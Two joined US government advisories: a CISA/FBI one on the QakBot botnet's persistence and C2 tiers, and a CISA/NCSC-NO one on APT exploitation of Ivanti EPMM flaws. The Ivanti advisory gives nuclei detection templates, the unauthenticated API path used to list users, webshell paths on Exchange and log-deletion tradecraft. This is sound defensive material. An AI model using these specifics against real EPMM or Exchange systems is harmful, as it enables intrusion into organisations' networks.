CISA and FBI encourage organizations to implement the recommendations in the Mitigations section to reduce the likelihood of QakBot-related activity and promote identification of QakBot-facilitated ransomware and malware infections. Note: The disruption of QakBot infrastructure does not mitigate other previously installed malware or ransomware on victim computers. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to a local FBI Field Office or CISA at cisa.gov/report.
Download the PDF version of this report:


AA23-242A Identification and Disruption of QakBot Infrastructure
(PDF,       570.50 KB
  )


For a downloadable copy of IOCs, see:


AA23-242A STIX XML
(XML,       51.62 KB
  )




AA23-242A STIX JSON
(JSON,       43.12 KB
  )


TECHNICAL DETAILS
Overview
QakBot—also known as Qbot, Quackbot, Pinkslipbot, and TA570—is responsible for thousands of malware infections globally. QakBot has been the precursor to a significant amount of computer intrusions, to include ransomware and the compromise of user accounts within the Financial Sector. In existence since at least 2008, QakBot feeds into the global cybercriminal supply chain and has deep-rooted connections to the criminal ecosystem. QakBot was originally used as a banking trojan to steal banking credentials for account compromise; in most cases, it was delivered via phishing campaigns containing malicious attachments or links to download the malware, which would reside in memory once on the victim network.
Since its initial inception as a banking trojan, QakBot has evolved into a multi-purpose botnet and malware variant that provides threat actors with a wide range of capabilities, to include performing reconnaissance, engaging in lateral movement, gathering and exfiltrating data, and delivering other malicious payloads, including ransomware, on affected devices. QakBot has maintained persistence in the digital environment because of its modular nature. Access to QakBot-affected (victim) devices via compromised credentials are often sold to further the goals of the threat actor who delivered QakBot.
QakBot and affiliated variants have targeted the United States and other global infrastructures, including the Financial Services, Emergency Services, and Commercial Facilities Sectors, and the Election Infrastructure Subsector. FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood of QakBot-related infections and promote identification of QakBot-induced ransomware and malware infections. Disruption of the QakBot botnet does not mitigate other previously installed malware or ransomware on victim computers. If a potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to CISA and FBI.
QakBot Infrastructure
QakBot’s modular structure allows for various malicious features, including process and web injection, victim network enumeration and credential stealing, and the delivery of follow-on payloads such as Cobalt Strike,1, Brute Ratel, and other malware. QakBot infections are particularly known to precede the deployment of human-operated ransomware, including Conti,2, ProLock,3, Egregor,4, REvil,5, MegaCortex,6, Black Basta,7, Royal,8, and PwndLocker.
Historically, QakBot’s C2 infrastructure relied heavily on using hosting providers for its own infrastructure and malicious activity. These providers lease servers to malicious threat actors, ignore abuse complaints, and do not cooperate with law enforcement. At any given time, thousands of victim computers running Microsoft Windows were infected with QakBot—the botnet was controlled through three tiers of C2 servers.

 

Figure 1: QakBot’s Tiered C2 Servers

The first tier of C2 servers includes a subset of thousands of bots selected by QakBot administrators, which are promoted to Tier 1 “supernodes” by downloading an additional software module. These supernodes communicate with the victim computers to relay commands and communications between the upstream C2 servers and the infected computers. As of mid-June 2023, 853 supernodes have been identified in 63 countries, which were active that same month. Supernodes have been observed frequently changing, which assists QakBot in evading detection by network defenders. Each bot has been observed communicating with a set of Tier 1 supernodes to relay communications to the Tier 2 C2 servers, serving as proxies to conceal the main C2 server. The Tier 3 server controls all of the bots.
Indicators of Compromise
FBI has observed the following threat actor tactics, techniques, and procedures (TTPs) in association with OakBot infections:

QakBot sets up persistence via the Registry Run Key as needed. It will delete this key when running and set it back up before computer restart: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<random_string>
QakBot will also write its binary back to disk to maintain persistence in the following folder: C:\Users\<user>\AppData\Roaming\Microsoft\<random_string>\
QakBot will write an encrypted registry configuration detailing information about the bot to the following registry key: HKEY_CURRENT_USER\Software\Microsoft\<random_string>

In addition, the below IP addresses were assessed to have obtained access to victim computers. Organizations are encouraged to review any connections with these IP addresses, which could potentially indicate a QakBot and/or follow-on malware infection.
Disclaimer: The below IP addresses are assessed to be inactive as of August 29, 2023. Several of these observed IP addresses were first observed as early as 2020, although most date from 2022 or 2023, and have been historically linked to QakBot. FBI and CISA recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.

Organizations are also encouraged to review the Qbot/QakBot Malware presentation from the U.S. Department of Health & Human Services Cybersecurity Program for additional information.
MITRE ATT&CK TECHNIQUES
For detailed associated software descriptions, tactics used, and groups that have been observed using this software, see MITRE ATT&CK’s page on QakBot.,9,
MITIGATIONS
Note: For situational awareness, the following SHA-256 hash is associated with FBI’s QakBot uninstaller: 7cdee5a583eacf24b1f142413aabb4e556ccf4ef3a4764ad084c1526cc90e117
CISA and FBI recommend network defenders apply the following mitigations to reduce the likelihood of QakBot-related activity and promote identification of QakBot-induced ransomware and malware infections. Disruption of the QakBot botnet does not mitigate other already-installed malware or ransomware on victim computers. Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Best Practice Mitigation Recommendations

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud),CPG 2.O, 2.R, 5.A,.
Require all accounts with password logins (e.g., service accounts, admin accounts, and domain admin accounts) to comply with NIST’s standards when developing and managing password policies,CPG 2.B,. This includes:

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Use phishing-resistant multi-factor authentication (MFA),CPG 2.H, (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services as possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins. For additional guidance on secure MFA configurations, visit cisa.gov/MFA and CISA’s Implementing Phishing-Resistant MFA Factsheet.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities of internet-facing systems,CPG 1.E,. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. Specifically, Cyber Hygiene services can help provide a second-set of eyes on organizations’ internet-accessible assets. Organizations can email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks to restrict adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated malware with a networking monitoring tool. To aid in detecting the malware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege,CPG 2.D, 2.E,.
Disable unused ports,CPG 2.V, 2.W, 2X,.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task,CPG 2.E,.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Perform regular secure system backups and create known good copies of all device configurations for repairs and/or restoration. Store copies off-network in physically secure locations and test regularly,CPG 2.R,.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

Ransomware Guidance

CISA.gov/stopransomware is a whole-of-government resource that serves as one central location for ransomware resources and alerts.
CISA, FBI, the National Security Agency (NSA), and Multi-State Information Sharing and Analysis Center (MS-ISAC) published an updated version of the #StopRansomware Guide, as ransomware actors have accelerated their tactics and techniques since its initial release in 2020.
CISA has released a new module in its Cyber Security Evaluation Tool (CSET), the Ransomware Readiness Assessment (RRA). CSET is a desktop software tool that guides network defenders through a step-by-step process to evaluate cybersecurity practices on their networks.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and FBI also recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see MITRE ATT&CK’s page on QakBot).,9,
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques.
REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with QakBot-affiliated actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. FBI and CISA do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at cisa.gov/report.
RESOURCES

HHS: Qbot/QakBot Malware
CISA: CPGs
NIST: 800-63B Digital Identity Guidelines
CISA: MFA
CISA: Implementing Phishing-Resistant MFA
CISA: Known Exploited Vulnerabilities Catalog
CISA: Cyber Hygiene
CISA: Zero Trust
CISA: #StopRansomware
CISA: #StopRansomware Guide
CISA: CSET Tool Sets Sights on Ransomware Threat

REFERENCES

MITRE: Cobalt Strike
MITRE: Conti
MITRE: ProLock
MITRE: Egregor
MITRE: REvil
MITRE: MegaCortex
MITRE: Black Basta
MITRE: Royal
MITRE: QakBot

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and FBI.
VERSION HISTORY
August 30, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a
21,"



SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and the Norwegian National Cyber Security Centre (NCSC-NO) are releasing this joint Cybersecurity Advisory (CSA) in response to active exploitation of CVE-2023-35078 and CVE-2023-35081. Advanced persistent threat (APT) actors exploited CVE-2023-35078 as a zero day from at least April 2023 through July 2023 to gather information from several Norwegian organizations, as well as to gain access to and compromise a Norwegian government agency’s network.
Ivanti released a patch for CVE-2023-35078 on July 23, 2023. Ivanti later determined actors could use CVE-2023-35078 in conjunction with another vulnerability CVE-2023-35081 and released a patch for the second vulnerability on July 28, 2023. NCSC-NO observed possible vulnerability chaining of CVE-2023-35081 and CVE-2023-35078.
CVE-2023-35078 is a critical vulnerability affecting Ivanti Endpoint Manager Mobile (EPMM) (formerly known as MobileIron Core). The vulnerability allows threat actors to access personally identifiable information (PII) and gain the ability to make configuration changes on compromised systems. CVE-2023-35081 enables actors with EPMM administrator privileges to write arbitrary files with the operating system privileges of the EPMM web application server. Threat actors can chain these vulnerabilities to gain initial, privileged access to EPMM systems and execute uploaded files, such as webshells.
Mobile device management (MDM) systems are attractive targets for threat actors because they provide elevated access to thousands of mobile devices, and APT actors have exploited a previous MobileIron vulnerability. Consequently, CISA and NCSC-NO are concerned about the potential for widespread exploitation in government and private sector networks.
This CSA provides indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) obtained by NCSC-NO investigations. The CSA also includes a nuclei template to identify unpatched devices and detection guidance organizations can use to hunt for compromise. CISA and NCSC-NO encourage organizations to hunt for malicious activity using the detection guidance in this CSA. If potential compromise is detected, organizations should apply the incident response recommendations included in this CSA. If no compromise is detected, organizations should still immediately apply patches released by Ivanti.
Download the PDF version of this report:


AA23-213A PDF
(PDF,       492.43 KB
  )


Download the .xml or .json file associated with this report:


AA23-213A STIX XML
(XML,       277.43 KB
  )




AA23-213A STIX JSON
(JSON,       250.01 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
In July 2023, NCSC-NO became aware of APT actors exploiting a zero-day vulnerability in Ivanti Endpoint Manager (EPMM), formerly known as MobileIron Core, to target a Norwegian government network. Ivanti confirmed that the threat actors exploited CVE-2023-35078 and released a patch on July 23, 2023.[1] Ivanti later determined actors could use CVE-2023-35078 in conjunction with another vulnerability, CVE-2023-35081, and released a patch for the second vulnerability on July 28, 2023.[2]
CVE-2023-35078 is a critical authentication bypass [CWE-288] vulnerability affecting Ivanti Endpoint Manager Mobile (EPMM), formerly known as MobileIron Core. The vulnerability allows unauthenticated access to specific application programming interface (API) paths. Threat actors with access to these API paths can access PII such as names, phone numbers, and other mobile device details of users on the vulnerable system; make configuration changes to vulnerable systems; push new packages to mobile endpoints; and access Global Positioning System (GPS) data if enabled.
According to Ivanti, CVE-2023-35078 can be chained with a second vulnerability CVE-2023-35081.[2] CVE-2023-35081 is directory traversal vulnerability [CWE-22] in EPMM. This vulnerability allows threat actors with EPMM administrator privileges the capability to write arbitrary files, such as webshells, with operating system privileges of the EPMM web application server. The actors can then execute the uploaded file.[2]
CISA added CVE-2023-35078 to its Known Exploited Vulnerabilities Catalog on July 25, 2023, and CVE-2023-35081 on July 31, 2023.
CISA and NCSC-NO are concerned about the potential for widespread exploitation of both vulnerabilities in government and private sector networks because MDM systems provide elevated access to thousands of mobile devices. Threat actors, including APT actors, have previously exploited a MobileIron vulnerability [3],[4].
APT Actor Activity
The APT actors have exploited CVE-2023-35078 since at least April 2023. The actors leveraged compromised small office/home office (SOHO) routers, including ASUS routers, to proxy [T1090] to target infrastructure, and NCSC-NO observed the actors exploiting CVE-2023-35078 to obtain initial access to EPMM devices [T1190] and:

Perform arbitrary Lightweight Directory Access Protocol (LDAP) queries against the Active Directory (AD).
Retrieve LDAP endpoints [T1018].
Use API path /mifs/aad/api/v2/authorized/users to list users and administrators [T1087.002] on the EPMM device.
Make EPMM configuration changes (Note: It is unknown what configuration changes the actors made).
Regularly check EPMM Core audit logs [T1005].

The APT actors deleted some of their entries in Apache httpd logs [T1070] using mi.war, a malicious Tomcat application that deletes log entries based on the string in keywords.txt. The actors deleted log entries with the string Firefox/107.0.
The APT actors used Linux and Windows user agents with Firefox/107.0 to communicate with EPMM. Other agents were used; however, these user agents did not appear in the device logs. It is unconfirmed how the threat actors ran shell commands on the EPMM device; however, NCSC-NO suspects the actors exploited CVE-2023-35081 to upload webshells on the EPMM device and run commands [T1059].
The APT actors tunneled traffic [T1572] from the internet through Ivanti Sentry, an application gateway appliance that supports EPMM, to at least one Exchange server that was not accessible from the internet [T1090.001]. It is unknown how they tunneled traffic. NCSC-NO observed that the network traffic used the TLS certificate of the internal Exchange server. The APT actors likely installed webshells [T1505.003] on the Exchange server in the following paths [T1036.005]:

/owa/auth/logon.aspx
/owa/auth/logoff.aspx
/owa/auth/OutlookCN.aspx

NCSC-NO also observed mi.war on Ivanti Sentry but do not know how the actors placed it there.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 1—Table 7 for all referenced threat actor tactics and techniques in this advisory.
Table 1: APT Actors ATT&CK Techniques for Initial Access



Technique Title
ID
Use




Exploit Public-Facing Application
T1190
The APT actors exploited CVE-2023-35078 in public facing Ivanti EPMM appliances since at least April 2023.



Table 2: APT Actors ATT&CK Techniques for Execution



Technique Title
ID
Use




Command and Scripting Interpreter
T1059
The APT actors may have exploited CVE-2023-35081 to upload webshells on the EPMM device and run commands.



Table 3: APT Actors ATT&CK Techniques for Discovery



Technique Title
ID
Use




Account Discovery: Domain Account
T1087.002
The APT actors exploited CVE-2023-35078 to gather EPMM device users and administrators.


Remote System Discovery
T1018
The APT actors retrieved LDAP endpoints.



Table 4: APT Actors ATT&CK Techniques for Persistence



Technique Title
ID
Use




Masquerading: Match Legitimate Name or Location
T1036.005
The APT actors likely installed webshells at legitimate Exchange server paths.


Server Software Component: Web Shell
T1505.003
The APT actors implanted webshells on the compromised infrastructure.



Table 5: APT Actor ATT&CK Techniques for Defense Evasion



Technique Title
ID
Use




Indicator Removal
T1070
APT actors deleted httpd access logs after the malicious activities took place using string Firefox/107.0.



Table 6: APT Actor ATT&CK Techniques for Collection



Technique Title
ID
Use




Data from Local System
T1005
APT actors regularly checked EPMM Core audit logs.



Table 7: APT Actor ATT&CK Techniques for Command and Control



Technique Title
ID
Use




Protocol Tunneling
T1572
The APT actors tunneled traffic from the internet to an Exchange server that was not accessible from the internet.


Proxy
T1090

The actors leveraged compromised SOHO routers to proxy to and compromise infrastructure.
The actors tunneled traffic from the internet to at least one Exchange server.



Proxy: Internal Proxy
T1090.001
The APT actors tunneled traffic from the internet to an Exchange server that was not accessible from the internet.



EVIDENCE OF VULNERABILITY METHODS
CISA recommends administrators use the following CISA-developed nuclei template to determine vulnerability to CVE-2023-30578:




id: CVE-2023-35078-Exposure
 
info:
  name: Ivanti EPMM Remote Unauthenticated API Access
  author: JC
  severity: critical
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-35078
  description: Identifies vulnerable instances of Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, through 11.10 allows remote attackers to obtain PII, add an administrative account, and change the configuration because of an authentication bypass.
  tags: ivanti, mobileiron, epmm, auth-bypass
 
requests:
  - method: GET
    path:
      - ""{{RootURL}}/mifs/aad/api/v2/ping""
 
    matchers-condition: and
    matchers:
                   
      - type: status
        status:
          - 200
       
      - type: word
        part: body
        words:
          - ""vspVersion""
          - ""apiVersion""
        condition: and




CISA recommends administrators use the following CISA-developed nuclei template to determine vulnerability to CVE-2023-35081:




id: CVE-2023-35081
 
info:
  name: Ivanti EPMM Remote Arbitrary File Write
  author: JC
  severity: High
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-35081
  description: Identifies vulnerable unpatched versions of Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, through 11.10.0.3, 11.9.1.2, and 11.8.1.2 that allows an authenticated administrator to perform arbitrary file writes to the EPMM server.
  tags: ivanti, mobileiron, epmm
 
requests:
  - method: GET
    path:
      - ""{{RootURL}}/mifs/c/windows/api/v2/device/registration""
 
    matchers-condition: and
    matchers:
                   
      - type: status
        status:
          - 200
       
      - type: regex
        part: all
        regex:
          - '.*\?VSP ((0?[0-9]|10)(\.\d+){1,3}|11\.(0?[0-7])(\.\d+){1,2}|11\.8\.0(\.\d+)?|11\.8\.1\.[0-1]|11\.9\.0(\.\d+)?|11\.9\.1\.[0-1]|11\.10\.0\.[0-2]).*'




Run the following NCSC-NO-created checks to check for signs of compromise:

Investigate logs in centralized logging solutions or forwarded syslogs from EPMM devices for any occurrences of /mifs/aad/api/v2/.
Look for spikes or an increase of EventCode=1644 in the AD since at least April 2023. The LDAP queries performed by EPMM when the threat actor used the MIFS API generated tens of millions of this event code. Also look for EventCodes 4662, 5136, and 1153.
To detect tunneling activity through Sentry, look for traffic from EPMM devices to other internal servers, as well as TLS traffic towards instances of EPMM with different TLS certificates than the instance itself would possess. Traffic to EPMM with certificates originating from endpoints further inside the network, e.g. standard Windows generated certificates such as CN=EXCHANGE01 or similar.
Perform forensic analysis of disk and memory since log retention may be poor and threat actors have been observed deleting log entries. Pay particular attention to unallocated disk space (free space on filesystem).
Check for activity from ASUS routers in your own country towards EPMM and Sentry devices.

INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or to NCSC-NO via NCSC-NO's 24/7 Operations Center (cert@ncsc.no or +47 23 31 07 50).

MITIGATIONS
CISA and NCSC-NO recommend organizations:

Upgrade Ivanti EPMM versions to the latest version as soon as possible. See Ivanti CVE-2023-35081 - Remote Arbitrary File Write for patch information. This patch protects against CVE-2023-35078 and CVE-2023-35081.

See the Evidence of Vulnerability Methods section of this advisory for CISA-developed nuclei templates to find any EPMM versions vulnerable to CVE-2023-35078 and CVE-2023-35081.
Organizations using unsupported versions (i.e., versions prior to 11.8.1.0) should immediately upgrade to a supported version. If you cannot immediately upgrade, apply the Ivanti-provided RPM fix for CVE-35078 (this workaround does not protect against CVE-2023-35081):

Login to command line shell (CLI) in enable mode.
Run the following command: # install rpm url https://support.mobileiron.com/ivanti-updates/ivanti-security-update-1.0.0-1.noarch.rp
See Ivanti’s Knowledge Base (KB) Remote unauthenticated API access vulnerability - CVE-2023-35078 for more information on the RPM fix.




Treat MDM systems as high-value assets (HVAs) with additional restrictions and monitoring. MDM systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring.
Follow best cybersecurity practices in production and enterprise environments, including mandating phishing-resistant multifactor authentication (MFA) for all staff and services. For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and NCSC-NO also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and NCSC-NO recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started: 

Select an ATT&CK technique described in this advisory (see Table 1–Table 7).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES
[1] Ivanti: CVE-2023-35078 – Remote Unauthenticated API Access Vulnerability
[2] Ivanti: CVE-2023-35081 – Remote Arbitrary File Write
[3] CISA: Potential for China Cyber Response to Heightened U.S.-China Tensions
[4] CISA: Top Routinely Exploited Vulnerabilities
RESOURCES

Mnemonic: Ivanti Endpoint Manager Mobile (EPMM) Authentication Bypass Vulnerability
Mnemonic: Threat Advisory: Remote File Write Vulnerability in Ivanti EPMM

ACKNOWLEDGEMENTS
Ivanti contributed to this joint advisory.
NCSC-NO wishes to acknowledge Mnemonic’s contributions.
VERSION HISTORY
August 1, 2023: Initial version.
August 2, 2023: Added stix file, updated Acknowledgements section, and added Resources section.
APPENDIX: INDICATORS OF COMPROMISE
NCSC-NO observed the following webshell hash:



c0b42bbd06d6e25dfe8faebd735944714b421388



NCSC-NO observed the following hash of mi.war:



1cd358d28b626b7a23b9fd4944e29077c265db46



NCSC-NO observed the following JA3 hashes used against MobileIron Core:




2d5bd942ebf308df61e1572861d146f6
473cd7cb9faa642487833865d516e578
579ccef312d18482fc42e2b822ca2430
849d3331f3e07a0797a02f12a6a82aa9
8d9f7747675e24454cd9b7ed35c58707
ad55557b7cbd735c2627f7ebb3b3d493
cd08e31494f9531f560d64c695473da9
e1d8b04eeb8ef3954ec4f49267a783ef
e60dc8370ecf78cf115162fbc257baf5
e669667efb41c36f714c309243f41ca7
e84a32d43db750b206cb6beed08281d0
eb5fdc72f0a76657dc6ea233190c4e1c




NCSC-NO observed the following JA3 hashes used against Exchange when tunneling via EPMM Sentry:




0092ce298a1d451fbe93dc4237053a96
00e872019b976e69a874ee7433038754
01ecd9ab9be75e832c83c082be3bdf18
0212a88c7ed149febdefa347c610b248
02be3b93640437dbba47cc7ed5ab7895
03f8852448a85e14f2b4362194160c32
045f8ccdac6d4e769b30da406808da71
04e7f5787f89a597001b50a37b9f8078
070f9fe9f0ec69e6b8791d280fde6a48
07a624d7236cca3934cf1f8e44b74b52
09df72c01a1a0ad193e2fff8e454c9c4
0b28842d64a344c287e6165647f3b3fe
0b8e1211de50d244b89e6c1b366d3ccf
0cb0380cf75a863b3e40a0955b1ada9f
0da24834056873a8cd8311000088e8be
0e1fad8ffaa7a939f0a6cbf9cd7e2fcd
0f6e78839398c245d13f696a3216d840
119f8c9050d1499b6f958b857868b8ce
11c506d5e3fb7e119c4287202c96a930
1336df27f94b25a25acac9db3e61e461
14671c3f8deca7d73a03b74cb854c21d
146caf9bd0153428f54e9ef472154983
14994353f3ea6fd25952a8c7d57f9ecf
151bc875df15d1385e6eb02f9edaba06
15a074a397727b26a846b443b99c20ff
1660f3d882a4311ca013ee4586e01fd9
16a74fc216f8a4ce43466bb83b6d3fd2
188623fdd056c4ed13d1ff34c7377637
19f51486abd40c9f0fc0503559a6c523
1a024e63721c610d2e54e67d62cd5460
1aa7dae8f2ae0a29402ed51819f82db4
1abfdeaadb74a0f7c461e7bab157b17f
1b6720ed0b67c910a80722ce973d6217
1b7d9368c6ce7623fdbc43f013626535
1e0850e10a00c9bbdd5c582ff4cb6833
1ec71612e438cf902913eec993475eb9
206fed3a39d9215c35395663f5bb3307
22cc1b3bc9f99d3a520ae58fee79a0d5
23e3e6fa8b23d9bc19e82de4e64c79e9
253fd4659bf21be116858bc0f206c5b9
276e175d4fe8454c4c47e966d8cb3fa3
289a450c7478dd52a10c6ed2fb47f7e9
2aa8ba7478b1362274666d714df575bc
2beecb6b9e386f29d568229a9953c3d2
2ebc7fdceaa9a0df556e989d77157006
3003024afe64b4e8a5a30825c14bbb12
3082e669dda9d023e2dcd8b9549a84a8
309d33c6f77a3fc75654c44c61596ccd
30a9f568eb3df79352fc587a078623b6
30be84e6b95f44c203f8e7fce7339a8e
3268a5097a543c7dbd82c39a9193b7fe
32775ead3ea1ad7db2f4bea67fe0cabb
34ac9a6ef5d285119abec50fbe41fcfe
34d92552e278710c1e84f0bd8dc3a6b8
361f47a6357cc6e3a9bcdd20cfaaf0e9
3685abc75517e61e47e52e5f2d060f54
3744004013135b9f9a05cb58cda8134d
37d952966ea7e79277803f13d7147544
391a4c2c7541b8b78e2f99bf586e9794
393662e5aa0cb49c5d666a6d10a1ade6
3962b622c5aa815afb803b92aa948424
3b22af324abded2781ed8f6a61f3654f
3b30b4555cc8b4b164ad03cf322cbea8
3bd1bdb5e90b9590a8878bff2ada8204
3be529eb3a7daaf34f963a22188f6139
3dd13faad1c45eb0c23e4567210f7eac
403273b51f91cf3c333695e5532cb2c3
404f56045e436d53ead2177bf957ba39
41854adbc73b0b58e5c566f60bb0df25
43c22dabb1e6d2449a39c2f7e974d537
476e72bbda5b78d188766139889e3038
4898a51256ae7d914a5ffd5695973470
49230c486f0fd383cd301fe162d6a786
4959a611b9885022d81b4bc8e4b1d149
495c6ff7ca0379ad0891bac47917d09a
49d2bd08038dc7dada221008591940f9
4c1b73ec52e6eec0c5d20577fcbc9ef1
4d34db639ba84b11822fb3dac47ed7d1
5244b163f9326a1e5eaa8860f7543f99
539f1a5183800a96228458932f9307f7
5466368d4659f1b1470bcb09e65b484d
549cde6535a884126755fc53f59a820c
555389e92c622b87d3fc395fd8723501
588d0b42e54174a98e1eca59945e8b32
58bc21d305a65c41745327f142f3ac12
59401c9a60449c742d073d93d1b7039a
59eec218522cc5c7743a0d37892a3345
59faf75430e9326d3ae9d231bb3ae8c6
5d0259ca16cfc2d7d1b0fac69f29ab05
5d55026fb84dba91ac01e2095504b1bc
5e35f50c692081fd6c7ddac1272e2d6c
5f4d5965af741bba59b7c8d3425f33dd
6010282004917ecf3900babf61456432
6088c2a04c94cdcd5a283a6d1622ffba
61dee38d2f97220efb1218ad8971e3ab
62ac194f2526eb45485526bca35c8f43
634296a023280d020674c873d0199760
635755dadfab8b92fb502aafb09122db
63fc58be0d7b48eaa34da7f752ae8ae6
6441640409815cfb4bf469e685e1bdb5
646973d1928c401ba80961c12cbf84a2
65eef0a0ee257254ef0418aa57192cfb
66f6a192083a7ab00ae8e0b5cc52e8f4
67a42e2e27ffc26d1f3d0ceb8384afd0
689385f1218e0d4c347595648ca6a776
692f91c0c5e9e93e0a24bd3392887ca1
69ecf52960c8bd9e746dfe9ee19c11f6
6e359f3bbc622e9b1ed36f6e3d521bcf
6e3650528f719fc50988a1f697644832
6ead0d5d3f87911c27f3ae0a75e6b5bc
6f1fa8b444caf0d8238f948279ca74e1
6fb8cdf567dd7d89d53b5771d769cb5f
706b6055658aff067ae370f23831ef6b
708140c311d3d69418f75c928e7535a0
719ec5da8f2153a436ee8567ff609894
7292ef4cdca529071fad97496e1c9439
74871691eac48156ce0da2cfa3ab401a
74cf24f2a66a31c88b6fcfe01f12160c
75e874d8e0a79697633b87ea5e798b1c
76c0d09fed2f33babb0de8ee2c07144c
77a01363fa2b29af25c004da9570e23c
